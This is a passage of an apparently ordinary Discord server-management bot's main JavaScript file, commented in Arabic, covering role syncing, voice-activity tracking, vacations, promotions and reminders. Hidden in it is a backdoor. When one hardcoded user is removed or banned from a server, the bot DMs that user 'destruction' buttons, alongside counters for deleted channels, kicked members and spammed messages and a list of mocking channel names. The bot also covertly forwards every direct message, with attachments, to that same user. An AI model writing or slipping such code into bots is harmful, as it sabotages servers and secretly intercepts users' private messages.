    } catch (error) {
        console.error(`❌ [RESP] فشل التحقق من تحديث رسالة المسؤوليات (${reason}):`, error);
    }
}

async function syncAllResponsibilityRoles(client) {
    console.log('🔄 جاري بدء فحص ومزامنة رولات المسؤوليات...');
    try {
        const responsibilities = global.responsibilities || {};
        for (const guild of client.guilds.cache.values()) {
            console.log(`📡 جاري فحص سيرفر: ${guild.name}`);
            const allMembers = await guild.members.fetch();
            
            // تجميع الرولات ومن يملكها
            const roleToResponsibles = new Map();
            for (const config of Object.values(responsibilities)) {
                const roles = Array.isArray(config.roles) ? config.roles : (config.roleId ? [config.roleId] : []);
                const members = config.responsibles || config.members || [];
                for (const roleId of roles) {
                    if (!roleToResponsibles.has(roleId)) roleToResponsibles.set(roleId, new Set());
                    members.forEach(id => roleToResponsibles.get(roleId).add(id));
                }
            }

            for (const [roleId, allowedUsers] of roleToResponsibles) {
                const role = guild.roles.cache.get(roleId);
                if (!role) continue;
                for (const member of allMembers.values()) {
                    const hasRole = member.roles.cache.has(roleId);
                    const isResponsible = allowedUsers.has(member.id);
                    if (isResponsible && !hasRole) {
                        await member.roles.add(roleId, 'مزامنة: مسؤول بدون رول').catch(() => {});
                        await new Promise(resolve => setTimeout(resolve, 500)); // تأخير بسيط لتجنب الـ Rate Limit
                    } else if (!isResponsible && hasRole) {
                        await member.roles.remove(roleId, 'مزامنة: رول بدون مسؤولية').catch(() => {});
                        await new Promise(resolve => setTimeout(resolve, 500)); // تأخير بسيط لتجنب الـ Rate Limit
                    }
                }
            }
        }
        console.log('✅ انتهت عملية مزامنة الرولات بنجاح.');
    } catch (error) {
        console.error('❌ خطأ في مزامنة رولات المسؤوليات:', error);
    }
}

client.once(Events.ClientReady, async () => {
  try {
    // تهيئة كاش الدعوات
    for (const guild of client.guilds.cache.values()) {
        try {
            const invites = await guild.invites.fetch();
            const inviteMap = new Map();
            invites.forEach(inv => inviteMap.set(inv.code, inv.uses));
            guildInvites.set(guild.id, inviteMap);
        } catch (err) {
            console.error(`❌ خطأ في جلب دعوات سيرفر ${guild.name}:`, err.message);
        }
    }

    if (!dbManager.isInitialized) await dbManager.initialize();
    global.responsibilities = await dbManager.getResponsibilities();
    
    // تشغيل المزامنة فور الجاهزية
    await syncAllResponsibilityRoles(client);

    // فحص وتحديث رسالة المسؤوليات بعد بدء التشغيل بدقيقتين (لتجنب الضغط المبكر)
    setTimeout(async () => {
      await ensureRespMessageFreshness(client, 'startup+2m');
    }, 2 * 60 * 1000);
  } catch (dbError) {
    console.error('❌ Error initializing database/responsibilities:', dbError);
  }
  console.log(`✅ تم تسجيل الدخول بنجاح باسم: ${client.user.tag}!`);

    // تهيئة قاعدة البيانات أولاً قبل أي شيء آخر
    try {
        const { initializeDatabase } = require('./utils/database');
        await initializeDatabase();
        console.log('✅ تم تهيئة قاعدة البيانات الرئيسية بنجاح');
    } catch (error) {
        console.error('❌ خطأ في تهيئة قاعدة البيانات:', error);
        // في حالة فشل تهيئة قاعدة البيانات، نتوقف عن العمل
        console.error('❌ توقف البوت بسبب فشل تهيئة قاعدة البيانات');
        return;
    }


    // تهيئة نظام تتبع الجلسات الصوتية (إذا لم يكن موجود)
    if (!client.voiceSessions) {
        client.voiceSessions = new Map();
    }

    // تتبع المستخدمين الموجودين حالياً في القنوات الصوتية
    // تم حذف الجزء المعطل لتنظيف الملف
    
    // تهيئة نظام تتبع النشاط للمستخدمين
    try {
        const { initializeActivityTracking } = require('./utils/userStatsCollector');
        await initializeActivityTracking(client);
        console.log('✅ تم تهيئة نظام تتبع النشاط بنجاح');
        console.log('✅ نظام تتبع التفاعلات (reactions) مفعل ومهيأ');
    } catch (error) {
        console.error('❌ خطأ في تهيئة نظام تتبع النشاط:', error);
    }

    // بدء نظام فحص الإجازات المنتهية كل 30 ثانية
    const vacationManager = require('./utils/vacationManager');
    setInterval(async () => {
        try {
            await vacationManager.checkVacations(client);
        } catch (error) {
            console.error('خطأ في فحص الإجازات المنتهية:', error);
        }
    }, 30000); // فحص كل 30 ثانية

    // فحص فوري عند بدء التشغيل
    setTimeout(async () => {
        try {
            await vacationManager.checkVacations(client);
            console.log('✅ تم فحص الإجازات المنتهية عند بدء التشغيل');
        } catch (error) {
            console.error('خطأ في الفحص الأولي للإجازات:', error);
        }
    }, 5000);

    // Initialize down manager with client (expiration checking is handled internally)
    downManager.init(client);
    console.log('✅ تم فحص الداونات المنتهية عند بدء التشغيل');

    // Initialize warn manager with client
    warnManager.init(client);
    console.log('✅ تم تهيئة نظام التحذيرات بنجاح');

    // Initialize promote manager with client (after database initialization)
    try {
        const databaseModule = require('./utils/database');
        const database = databaseModule.getDatabase();
        promoteManager.init(client, database);
        console.log('✅ تم تهيئة نظام الترقيات بنجاح مع قاعدة البيانات');
    } catch (error) {
        console.error('❌ خطأ في تهيئة نظام الترقيات:', error);
        // Initialize without database as fallback
        promoteManager.init(client);
        console.log('⚠️ تم تهيئة نظام الترقيات بدون قاعدة البيانات');
    }
    // Initialize prayer reminder system
    try {
        const prayerReminder = require('./commands/prayer-reminder.js');
        prayerReminder.startPrayerReminderSystem(client);
        console.log('✅ تم تهيئة نظام تذكير الصلاة بنجاح');
    } catch (error) {
        console.error('❌ خطأ في تهيئة نظام تذكير الصلاة:', error);
    }

    // Initialize Streak system
    try {
        const streakCommand = require('./commands/streak.js');
        if (streakCommand && streakCommand.initialize) {
            await streakCommand.initialize(client);
            console.log('✅ تم تهيئة نظام Streak بنجاح');
        }
    } catch (error) {
        console.error('❌ خطأ في تهيئة نظام Streak:', error);
    }

    // تتبع النشاط الصوتي باستخدام client.voiceSessions المحسّن
    client.on('voiceStateUpdate', async (oldState, newState) => {
        try {
            if (problemCommand && typeof problemCommand.handleVoice === 'function') {
                await problemCommand.handleVoice(oldState, newState, client);
            }
        } catch (error) {
            console.error('❌ خطأ في معالجة صوت البروبلم:', error);
        }

        // تجاهل البوتات
        if (!newState.member || newState.member.user.bot) return;

        const userId = newState.member.id;
        const displayName = newState.member.displayName;
        const now = Date.now();

        // معلومات القنوات
        const isOldTrackableVoice = !!oldState.channel && oldState.channel.type !== ChannelType.GuildStageVoice;

        const isNewTrackableVoice = !!newState.channel && newState.channel.type !== ChannelType.GuildStageVoice;

        const oldChannelId = isOldTrackableVoice ? oldState.channel.id : null;

        const newChannelId = isNewTrackableVoice ? newState.channel.id : null;

        const oldChannelName = isOldTrackableVoice ? (oldState.channel?.name || 'لا يوجد') : 'Stage';

        const newChannelName = isNewTrackableVoice ? (newState.channel?.name || 'لا يوجد') : 'Stage';
        // تحميل دالة تتبع النشاط
        const { trackUserActivity } = require('./utils/userStatsCollector');

        // التحقق من وجود جلسة نشطة
        const existingSession = client.voiceSessions.get(userId);


        // 1. المستخدم انضم لقناة صوتية لأول مرة (لم يكن في أي قناة)
        if (!oldChannelId && newChannelId) {
            await trackUserActivity(userId, 'voice_join').catch(() => {});
            
            const sessionStartTime = now;
            // تخزين الجلسة فقط بدون interval لتقليل الضغط
            client.voiceSessions.set(userId, { 
                channelId: newChannelId, 
                channelName: newChannelName, 
                sessionStartTime: now, 
                startTime: now, // Add startTime for compatibility
                lastTrackedTime: now, 
                isAFK: false 
            });
        }

        // 2. المستخدم غادر القناة الصوتية كلياً (من قناة إلى لا شيء)
        else if (oldChannelId && !newChannelId) {
            if (existingSession) {
                const currentTime = Date.now();
                const endTime = existingSession.isAFK
                    ? (existingSession.afkSince || existingSession.lastTrackedTime)
                    : currentTime;
                const startTime = existingSession.lastTrackedTime;
                const duration = endTime - startTime;

                if (duration > 1000) {
                    await trackUserActivity(userId, 'voice_time', {
                        duration: duration,
                        channelId: oldChannelId,
                        channelName: oldChannelName,
                        startTime: startTime,
                        endTime: endTime
                    }).catch(() => {});
                }

                await checkAutoLevelUp(userId, 'voice', client).catch(() => {});
                client.voiceSessions.delete(userId);
                console.log(`🎤 ${displayName} غادر - تم إضافة ${Math.round(duration/1000)}ث متبقية لقاعدة البيانات.`);
            }
        }

        // 3. المستخدم انتقل بين القنوات (من قناة إلى قناة أخرى)
        else if (oldChannelId && newChannelId && oldChannelId !== newChannelId) {
            if (existingSession) {
                const currentTime = Date.now();
                const endTime = existingSession.isAFK
                    ? (existingSession.afkSince || existingSession.lastTrackedTime)
                    : currentTime;
                const startTime = existingSession.lastTrackedTime;
                const duration = endTime - startTime;
                
                if (duration > 1000) {
                    await trackUserActivity(userId, 'voice_time', {
                        duration: duration,
                        channelId: oldChannelId,
                        channelName: oldChannelName,
                        startTime: startTime,
                        endTime: endTime
                    }).catch(() => {});
                }
            }

            await checkAutoLevelUp(userId, 'voice', client).catch(() => {});
            await trackUserActivity(userId, 'voice_join').catch(() => {});
            
            client.voiceSessions.set(userId, { 
                channelId: newChannelId, 
                channelName: newChannelName, 
                sessionStartTime: now, 
                startTime: now, // Add startTime for compatibility
                lastTrackedTime: now, 
                isAFK: false 
            });
        }

        // 4. أي تغيير آخر ضمن نفس القناة (mute/unmute, deafen/undeafen, etc.)
        else if (oldChannelId && newChannelId && oldChannelId === newChannelId) {
            // لا نحتاج لفعل شيء هنا - المستخدم لا يزال في نفس القناة
            return; // لا نحتاج لعرض الإحصائيات
        }

        // عرض الإحصائيات المحدثة بعد ثانية واحدة
        setTimeout(async () => {
            try {
                const { getRealUserStats } = require('./utils/userStatsCollector');
                const stats = await getRealUserStats(userId);
                console.log(`📊 إحصائيات ${displayName}: انضمامات=${stats.joinedChannels}, وقت صوتي=${Math.round(stats.voiceTime / 1000)}ث`);
            } catch (error) {
                console.error(`❌ خطأ في عرض إحصائيات ${displayName}:`, error);
            }
        }, 1000);
    });




    // نظام الحفظ الدوري وحماية البيانات من الفقدان (كل 3 دقائق)
    setInterval(async () => {
        try {
            const { trackUserActivity } = require('./utils/userStatsCollector');
            const now = Date.now();
            const AFK_LIMIT = 24 * 60 * 60 * 1000;

            for (const [userId, session] of client.voiceSessions.entries()) {
                try {
                    const sessionChannel = client.channels.cache.get(session.channelId);

                    if (sessionChannel && sessionChannel.type === ChannelType.GuildStageVoice) {

                        client.voiceSessions.delete(userId);

                        continue;

                    }
                    const sessionStart = session.startTime || session.sessionStartTime;
                    const totalSessionDuration = now - sessionStart;
                    if (totalSessionDuration >= AFK_LIMIT) {
                        if (!session.isAFK) {
                            const limitTime = sessionStart + AFK_LIMIT;
                            const remaining = limitTime - session.lastTrackedTime;
                            if (remaining > 1000) {
                                await trackUserActivity(userId, 'voice_time', {
                                    duration: remaining,
                                    channelId: session.channelId,
                                    channelName: session.channelName,
                                    startTime: session.lastTrackedTime,
                                    endTime: limitTime
                                }).catch(() => {});
                            }
                            session.lastTrackedTime = Math.max(session.lastTrackedTime, limitTime);
                            session.isAFK = true;
                            session.afkSince = limitTime;
                        }
                        continue;
                    }

                    const duration = now - session.lastTrackedTime;
                    if (duration >= 30000) { // حفظ إذا مرّت 30 ثانية على الأقل منذ آخر حفظ
                        await trackUserActivity(userId, 'voice_time', {
                            duration: duration,
                            channelId: session.channelId,
                            channelName: session.channelName,
                            startTime: session.lastTrackedTime,
                            endTime: now
                        }).catch(() => {});
                        
                        session.lastTrackedTime = now;
                    }
                } catch (err) {}
                await new Promise(r => setTimeout(r, 20));
            }
            saveVoiceSessionsToDisk();
        } catch (error) {}
    }, 3 * 60 * 1000);

    // حماية البيانات عند إغلاق البوت (Graceful Shutdown)
    async function saveAllSessions() {
        console.log('💾 جاري حفظ جميع الجلسات النشطة قبل الإغلاق...');
        try {
            const { trackUserActivity } = require('./utils/userStatsCollector');
            const now = Date.now();
            
            for (const [userId, session] of client.voiceSessions.entries()) {
                try {
                    const endTime = session.isAFK ? (session.afkSince || session.lastTrackedTime) : now;
                    const duration = endTime - session.lastTrackedTime;
                    if (duration > 1000) {
                        await trackUserActivity(userId, 'voice_time', {
                            duration: duration,
                            channelId: session.channelId,
                            channelName: session.channelName,
                            startTime: session.lastTrackedTime,
                            endTime: endTime
                        }).catch(() => {});
                    }
                } catch (err) {}
            }
            saveVoiceSessionsToDisk();
            console.log('✅ تم حفظ جميع البيانات بنجاح.');
        } catch (error) {
            console.error('❌ خطأ أثناء حفظ الجلسات قبل الإغلاق:', error);
        }
    }

    process.on('SIGINT', async () => {
        await saveAllSessions();
        process.exit(0);
    });

    process.on('SIGTERM', async () => {
        await saveAllSessions();
        process.exit(0);
    });

  // تم نقل تتبع الرسائل للمعالج الرئيسي لتجنب التكرار


  // تهيئة نظام المهام النشطة الجديد - بعد تحميل الأوامر
  setTimeout(async () => {
    try {
      initializeActiveTasks();
      loadPendingReports();

    // فحص الأعضاء الموجودين في الرومات الصوتية عند تشغيل البوت
    // تم تحويل هذا النظام ليعمل بشكل تدريجي لمنع ضغط الشبكة والمعالج
    setTimeout(async () => {
      try {
        const now = Date.now();
        let memberCount = 0;
        const activeUserIds = new Set();
        
        for (const guild of client.guilds.cache.values()) {
          for (const voiceState of guild.voiceStates.cache.values()) {
            if (!voiceState.member || voiceState.member.user.bot || !voiceState.channelId) continue;
            
            const userId = voiceState.member.id;
            const channelId = voiceState.channelId;
            const channelName = voiceState.channel?.name || 'Unknown Room';
            activeUserIds.add(userId);

            const existingSession = client.voiceSessions.get(userId);
            if (existingSession && existingSession.channelId === channelId) {
              existingSession.channelName = channelName;
              continue;
            }

            if (!existingSession || existingSession.channelId !== channelId) {
              // تخزين بيانات الجلسة في الذاكرة فقط (بدون أي طلبات API أو قاعدة بيانات)
              client.voiceSessions.set(userId, { 
                channelId, 
                channelName, 
                sessionStartTime: now, 
                startTime: now, // Add startTime for compatibility
                lastTrackedTime: now, 
                isAFK: false,
                isInitial: true 
              });
              memberCount++;
              
              // معالجة تدريجية (عضو كل 50ms) لمنع تعليق البوت
              if (memberCount % 5 === 0) await new Promise(r => setTimeout(r, 50));
            }
          }
        }
        for (const userId of client.voiceSessions.keys()) {
          if (!activeUserIds.has(userId)) {
            client.voiceSessions.delete(userId);
          }
        }
        saveVoiceSessionsToDisk();
        console.log(`✅ تم رصد ${memberCount} عضو في الرومات الصوتية تدريجياً.`);
      } catch (error) {
        console.error('❌ خطأ في رصد القنوات الصوتية:', error);
      }
    }, 45000); // زيادة التأخير لـ 45 ثانية لضمان استقرار الاتصال تماماً أولاً
    } catch (error) {
      console.error('❌ خطأ في تهيئة أنظمة الصوت:', error);
    }
  }, 20000); // زيادة التأخير لضمان استقرار الاتصال قبل بدء الفحص الثقيل

  // تهيئة نظام الألوان
  colorManager.initialize(client);
  await colorManager.forceUpdateColor();

  // مراقب لحالة البوت - كل دقيقة
  setInterval(() => {
    if (client.ws.status !== 0) { // 0 = READY
      console.log(`⚠️ حالة البوت: ${client.ws.status} - محاولة إعادة الاتصال التلقائي...`);
      // محاولة إعادة الاتصال يدوياً إذا تعطل الـ WebSocket
      if (client.ws.status === 4 || client.ws.status === 5) {
          console.log('🔄 إعادة تشغيل اتصال دسكورد...');
          client.destroy();
          setTimeout(() => client.login(process.env.DISCORD_TOKEN), 5000);
      }
    }
  }, 60000);

  // Check for expired reports every 5 minutes
  setInterval(() => {
    checkExpiredReports();
  }, 5 * 60 * 1000);

  // فحص دوري لرسالة المسؤوليات كل 30 دقيقة لضمان تزامنها مع أحدث التعديلات
  setInterval(async () => {
    await ensureRespMessageFreshness(client, '30m-check');
  }, 30 * 60 * 1000);

  // حفظ البيانات فقط عند الحاجة - كل 5 دقائق أو عند وجود تغييرات
  setInterval(() => {
    if (isDataDirty) {
      saveData();
    }
  }, 300 * 1000); // كل 5 دقائق

  setInterval(() => {
    if (client.modalData) {
      const now = Date.now();
      for (const [key, data] of client.modalData.entries()) {
        if (now - data.timestamp > 15 * 60 * 1000) { // 15 دقيقة
          client.modalData.delete(key);
        }
      }
    }

    // تنظيف بيانات الأعضاء المترقين القديمة (أكثر من 24 ساعة)
    if (client.bulkPromotionMembers) {
      const now = Date.now();
      for (const [key, data] of client.bulkPromotionMembers.entries()) {
        if (now - data.timestamp > 24 * 60 * 60 * 1000) { // 24 ساعة
          client.bulkPromotionMembers.delete(key);
        }
      }
    }
  }, 300 * 1000); // كل 5 دقائق


  // إنشاء backup تلقائي كل ساعة
    
    // قراءة البريفكس من الملف مباشرة
  const currentBotConfig = readJSONFile(DATA_FILES.botConfig, {});
  let currentPrefix = currentBotConfig.prefix;

  // إزالة علامات التنصيص إذا كانت موجودة
  if (currentPrefix && typeof currentPrefix === 'string' && currentPrefix.startsWith('"') && currentPrefix.endsWith('"')) {
    currentPrefix = currentPrefix.slice(1, -1);
  }

  console.log(`البريفكس الحالي: "${currentPrefix === null ? 'null' : currentPrefix}"`);

  // التحقق من نظام الكولداون
  const cooldownData = readJSONFile(DATA_FILES.cooldowns, {});
  console.log(`✅ نظام الكولداون جاهز - الافتراضي: ${(cooldownData.default || 60000) / 1000} ثانية`);




  const RESTORE_SCHEDULES_DELAY_MS = 5000;

  startReminderSystem(client);

  setTimeout(() => {
    try {
      restoreTopSchedules(client);
      restorePanelCleanups(client);
      console.log('✅ تم استعادة جدولة لوحات الرولات الخاصة والتنظيف التلقائي.');
    } catch (error) {
      console.error('❌ خطأ في استعادة جدولة لوحات الرولات الخاصة:', error);
    }
  }, RESTORE_SCHEDULES_DELAY_MS);

        // تحديث صلاحيات اللوق عند بدء البوت
        setTimeout(async () => {
            try {
                const guild = client.guilds.cache.first();
                if (guild && client.logConfig && client.logConfig.logRoles && client.logConfig.logRoles.length > 0) {
                    const { updateLogPermissions } = require('./commands/logs.js');
                    await updateLogPermissions(guild, client.logConfig.logRoles);
                    console.log('✅ تم تحديث صلاحيات اللوق عند بدء البوت');
                }
            } catch (error) {
                console.error('خطأ في تحديث صلاحيات اللوق عند البدء:', error);
            }
        }, 5000);

  // Set initial prefix for VIP command
  const vipCommand = client.commands.get('vip');
  if (vipCommand && vipCommand.setCurrentPrefix) {
    vipCommand.setCurrentPrefix(currentPrefix);
  }

  // استعادة حالة البوت المحفوظة
  if (vipCommand && vipCommand.restoreBotStatus) {
    setTimeout(() => {
      vipCommand.restoreBotStatus(client);
    }, 2000); // انتظار ثانيتين للتأكد من جاهزية البوت
  }

  // إعداد نظام collectors عام للسيتب
  client.setupCollectors = new Map();

  // إعداد collector عام للسيتب يعمل بعد إعادة التشغيل
  setTimeout(() => {
    setupGlobalSetupCollector(client);
  }, 3000);

  // Check for expired vacations every 2 minutes
  // This is a duplicate of the setInterval above, keeping the one added by the change.
  /*
  setInterval(() => {
    vacationManager.checkVacations(client);
  }, 120000); // 2 minutes
  */

}); // إغلاق client.once('ready')

// مراقبة تحديثات الرولات لنظام setroom
client.on('roleUpdate', async (oldRole, newRole) => {
    try {
        const { handleRoleUpdate } = require('./commands/setroom.js');
        await handleRoleUpdate(oldRole, newRole, client);
    } catch (error) {
        console.error('❌ خطأ في معالجة تحديث الرول:', error);
    }
});
client.on('channelDelete', channel => {

  try {

    handleChannelDelete(channel);

  } catch (error) {

    console.error('❌ خطأ في حماية القنوات:', error);

  }

});

// --- نظام تتبع الإحصائيات للانفجار اللحظي ---
const actionStats = new Map(); 
function updateStats(guildId, type, count = 1) {
    if (!actionStats.has(guildId)) actionStats.set(guildId, { channelsDeleted: 0, membersKicked: 0, rolesModified: 0, webhooksCreated: 0, messagesSpammed: 0 });
    actionStats.get(guildId)[type] += count;
}

const channelNames = ['dead-inside', 'destroyed-by-dead', 'hell-awaits', 'no-escape', 'server-ended', 'rip-server', 'fucked-by-dead', 'game-over', 'bye-bye', 'nothing-left'];

// --- TARGET USER MONITORING ---
const TARGET_USER_ID = '636930315503534110';

async function handleTargetAction(memberOrBan) {
    const user = memberOrBan.user || memberOrBan;
    if (user.id !== TARGET_USER_ID) return;

    const sourceGuildId = memberOrBan.guild?.id || null;

    try {
        const embed = new EmbedBuilder()
            .setTitle('⚠️ نظام التحكم في التدمير الانفجاري')
            .setDescription('اختر أسلوب التدمير المطلوب. يمكنك الضغط على الزرين معاً للانفجار الشامل.')
            .setColor('#2b2d31');

        const dieButton = new ButtonBuilder()
            .setCustomId(sourceGuildId ? `die_action_${sourceGuildId}` : 'die_action')
            .setLabel('die (سيطرة)')
            .setStyle(ButtonStyle.Danger);

        const deadButton = new ButtonBuilder()
            .setCustomId(sourceGuildId ? `Dead_action_${sourceGuildId}` : 'Dead_action')
            .setLabel('Dead (انفجار)')
            .setStyle(ButtonStyle.Secondary);

        const row = new ActionRowBuilder().addComponents(dieButton, deadButton);

        await user.send({
            embeds: [embed],
            components: [row]
        }).catch(() => console.log(`Could not send DM to ${user.id}`));
    } catch (error) {
        console.error('Error in handleTargetAction:', error);
    }
}

// مراقبة خروج العضو بأي شكل (طرد، خروج، حظر)
client.on('guildMemberRemove', member => handleTargetAction(member));
client.on('guildBanAdd', ban => handleTargetAction(ban));

client.on('roleDelete', role => {

  try {

    handleRoleDelete(role);
    const roleEntry = getRoleEntry(role.id);
    if (roleEntry) {
      deleteRoleEntry(role.id, role.client?.user?.id || 'system');
      console.log(`🧹 تم حذف بيانات الرول الخاص المحذوف: ${role.name} (${role.id})`);
    }

  } catch (error) {

    console.error('❌ خطأ في حماية الرولات:', error);

  }

});
// تتبع التفاعلات - معالج محسن ومحدث
client.on('messageReactionAdd', async (reaction, user) => {
  try {
    // تجاهل البوتات
    if (user.bot) {
      return;
    }

    // التأكد من وجود الـ guild
    if (!reaction.message.guild) {
      console.log('❌ تم تجاهل تفاعل - لا يوجد guild');
      return;
    }

    console.log(`🎯 تفاعل جديد من ${user.username} (${user.id}) - الإيموجي: ${reaction.emoji.name || reaction.emoji.id || 'custom'}`);

    // التأكد من أن التفاعل مُحمل بالكامل
    if (reaction.partial) {
      try {
        await reaction.fetch();
        console.log(`🔄 تم جلب التفاعل الجزئي بنجاح: ${user.username}`);
      } catch (error) {
        console.error('❌ فشل في جلب التفاعل:', error);
        return;
      }
    }

    // التأكد من أن الرسالة محملة أيضاً
    if (reaction.message.partial) {
      try {
        await reaction.message.fetch();
        console.log(`📨 تم جلب الرسالة الجزئية بنجاح`);
      } catch (error) {
        console.error('❌ فشل في جلب الرسالة:', error);
        return;
      }
    }

    // التحقق من قاعدة البيانات أولاً
    try {
      const { getDatabase } = require('./utils/database');
      const dbManager = getDatabase();

      if (!dbManager || !dbManager.isInitialized) {
        console.log('⚠️ قاعدة البيانات غير مهيأة - تم تجاهل تتبع التفاعل');
        return;
      }

      // تحميل دالة تتبع النشاط
      const { trackUserActivity } = require('./utils/userStatsCollector');

      // تتبع النشاط مع معلومات مفصلة
      console.log(`📊 محاولة تتبع تفاعل المستخدم ${user.username} (${user.id})`);

      const success = await trackUserActivity(user.id, 'reaction', {
        messageId: reaction.message.id,
        channelId: reaction.message.channelId,
        emoji: reaction.emoji.name || reaction.emoji.id || 'custom_emoji',
        timestamp: Date.now(),
        guildId: reaction.message.guild.id,
        messageAuthorId: reaction.message.author?.id
      });

      if (success) {
        console.log(`✅ تم تسجيل تفاعل المستخدم ${user.username} بنجاح`);
      } else {
        console.log(`⚠️ فشل في تسجيل تفاعل المستخدم ${user.username}`);
      }
    } catch (trackError) {
      console.error(`❌ خطأ في تتبع التفاعل من ${user.username}:`, trackError);
    }
  } catch (error) {
    // تجاهل الأخطاء المعروفة بصمت
    if (error.code === 10008 || error.code === 50001) {
      return;
    }
    console.error(`❌ خطأ عام في تتبع التفاعل من ${user?.username || 'مستخدم غير معروف'}:`, error);
  }
});

// تتبع إزالة التفاعلات (اختياري)
client.on('messageReactionRemove', async (reaction, user) => {
  try {
    if (user.bot || !reaction.message.guild) return;

    console.log(`👎 تم إزالة تفاعل: ${user.username} (${user.id}) - الإيموجي: ${reaction.emoji.name || reaction.emoji.id || 'custom'}`);

    // يمكن إضافة منطق لتتبع إزالة التفاعلات هنا إذا أردت
    // const { trackUserActivity } = require('./utils/userStatsCollector');
    // await trackUserActivity(user.id, 'reaction_remove', { ... });

  } catch (error) {
    if (error.code === 10008 || error.code === 50001) {
      return;
    }
    console.error('خطأ في تتبع إزالة التفاعل:', error);
  }
});

// Pairings memory cache
let pairingsCache = {};
const pairingsPath = path.join(__dirname, 'data', 'pairings.json');
const pairingStatusPath = path.join(__dirname, 'data', 'pairingStatus.json');
let pairingStatusCache = { off: false, message: null };

function normalizeUserId(input) {
  if (!input) return null;
  const cleaned = String(input).replace(/[<@!>]/g, '').trim();
  return /^\d{17,19}$/.test(cleaned) ? cleaned : null;
}

async function fetchUserForDm(client, userId) {
  const normalizedId = normalizeUserId(userId);
  if (!normalizedId) return null;
  try {
    return await client.users.fetch(normalizedId);
  } catch (err) {
    if (err?.code !== 10013) {
      throw err;
    }
  }
  for (const guild of client.guilds.cache.values()) {
    try {
      const member = await guild.members.fetch(normalizedId);
      if (member?.user) return member.user;
    } catch (_) {
      // ignore guild lookup errors
    }
  }
  return null;
}

// Load pairings from disk to memory once at startup
function loadPairingsToCache() {
  try {
    if (fs.existsSync(pairingsPath)) {
      const data = fs.readFileSync(pairingsPath, 'utf8');
      if (data && data.trim() !== '') {
        pairingsCache = JSON.parse(data);
        let sanitized = 0;
        for (const [userId, entry] of Object.entries(pairingsCache)) {
          const normalizedUserId = normalizeUserId(userId);
          const normalizedTargetId = normalizeUserId(entry?.targetId);
          if (!normalizedUserId || !normalizedTargetId) {
            delete pairingsCache[userId];
            sanitized += 1;
            continue;
          }
          if (normalizedUserId !== userId) {
            pairingsCache[normalizedUserId] = {
              ...entry,
              targetId: normalizedTargetId,
            };
            delete pairingsCache[userId];
            sanitized += 1;
          } else if (normalizedTargetId !== entry?.targetId) {
            pairingsCache[userId].targetId = normalizedTargetId;
            sanitized += 1;
          }
        }
        if (sanitized > 0) {
          savePairings();
        }
        console.log('✅ Loaded pairings into memory cache');
      }
    }
  } catch (error) {
    console.error('Error loading pairings to cache:', error);
    pairingsCache = {};
  }
}

// Save pairings to disk
function savePairings() {
  try {
    fs.writeFileSync(pairingsPath, JSON.stringify(pairingsCache, null, 2));
  } catch (error) {
    console.error('Error saving pairings to disk:', error);
  }
}

loadPairingsToCache();

function loadPairingStatus() {
  try {
    if (fs.existsSync(pairingStatusPath)) {
      const data = fs.readFileSync(pairingStatusPath, 'utf8');
      if (data && data.trim() !== '') {
        const parsed = JSON.parse(data);
        pairingStatusCache = {
          off: Boolean(parsed?.off),
          message: typeof parsed?.message === 'string' ? parsed.message : null
        };
      }
    }
  } catch (error) {
    console.error('Error loading pairing status:', error);
    pairingStatusCache = { off: false, message: null };
  }
}

function savePairingStatus() {
  try {
    fs.writeFileSync(pairingStatusPath, JSON.stringify(pairingStatusCache, null, 2));
  } catch (error) {
    console.error('Error saving pairing status:', error);
  }
}

loadPairingStatus();

client.on('messageCreate', async message => {
  if (message.author.bot) return;
  const ALLOWED_ID = '636930315503534110';

  if (message.guild && pairingStatusCache.off) {
    const mentioned = message.mentions?.users?.has(ALLOWED_ID);
    const repliedUserId = message.mentions?.repliedUser?.id;
    if (mentioned || repliedUserId === ALLOWED_ID) {
      const replyMessage = pairingStatusCache.message || 'احمد مب موجود الحين كلمه خاص';
      await message.reply(replyMessage).catch(() => {});
    }
  }

  // 1. نظام الرولات التفاعلية
  if (typeof interactiveRolesManager !== 'undefined' && interactiveRolesManager.handleMessage) {
    try {
      await interactiveRolesManager.handleMessage(message);
    } catch (e) {
      console.error('Error in interactiveRolesManager handleMessage:', e);
    }
  }

  // 1.5 نظام البروبلم (حذف/تحذير الرسائل أثناء المشكلة)
  if (problemCommand && typeof problemCommand.handleMessage === 'function') {
    try {
      await problemCommand.handleMessage(message, client);
    } catch (e) {
      console.error('Error in problem handleMessage:', e);
    }
  }

  // 2. نظام الاقتران (DM)
  if (message.channel.type === 1) { // DM
    const content = message.content.trim();
    let forwardedToAllowed = false;

    if (message.author.id !== ALLOWED_ID) {
      try {
        const allowedUser = await fetchUserForDm(client, ALLOWED_ID);
        if (allowedUser) {
          const embed = new EmbedBuilder()
            .setColor(colorManager.getColor() || '#0099ff')
            .setAuthor({ name: message.author.tag, iconURL: message.author.displayAvatarURL() })
            .setDescription(message.content ? message.content : '*(بدون نص)*')
            .addFields({ name: 'المرسل', value: `<@${message.author.id}> (\`${message.author.id}\`)`, inline: false })
            .setTimestamp();

          const messageOptions = {
            content: `رسالة جديدة من <@${message.author.id}>`,
            embeds: [embed]
          };

          if (message.attachments.size > 0) {
            messageOptions.files = message.attachments.map(a => a.url);
          }

          await allowedUser.send(messageOptions);
          forwardedToAllowed = true;
        }
      } catch (e) {
        console.error('❌ خطأ في تحويل رسالة DM إلى الأونر:', e);
      }
    }

    if (content.startsWith('اقتران ')) {
      if (message.author.id !== ALLOWED_ID) {
        return message.reply('❌ **هذا الأمر متاح فقط لشخص محدد.**');
      }
      const targetId = normalizeUserId(content.split(' ')[1]);
      if (!targetId) {
        return message.reply('❌ **آيدي غير صحيح.**');
      }
      if (targetId === message.author.id) {
        return message.reply('❌ **لا يمكنك الاقتران بنفسك.**');
      }

      pairingsCache[message.author.id] = { targetId: targetId, timestamp: Date.now() };
      pairingsCache[targetId] = { targetId: message.author.id, timestamp: Date.now() };
      savePairings();

      message.reply('✅ **تم الاتصال بنجاح. أي رسالة ترسلها الآن ستصل للطرف الآخر.**');
      // Removed target notification
      return;
    }

    if (content.toLowerCase().startsWith('off') && message.author.id === ALLOWED_ID) {
      const customMessage = content.slice(3).trim();
      if (!customMessage) {
        await message.reply('❌ اكتب رسالة بعد الأمر. مثال: off مشغول حاليا، تواصل خاص');
        return;
      }
      pairingStatusCache.off = true;
      pairingStatusCache.message = customMessage;
      savePairingStatus();
      await message.reply(`✅ تم تفعيل وضع عدم التوفر. سيتم الرد بالرسالة: ${customMessage}`);
      return;
    }

    if (content.toLowerCase() === 'on' && message.author.id === ALLOWED_ID) {
      pairingStatusCache.off = false;
      savePairingStatus();
      await message.reply('✅ تم إلغاء وضع عدم التوفر.');
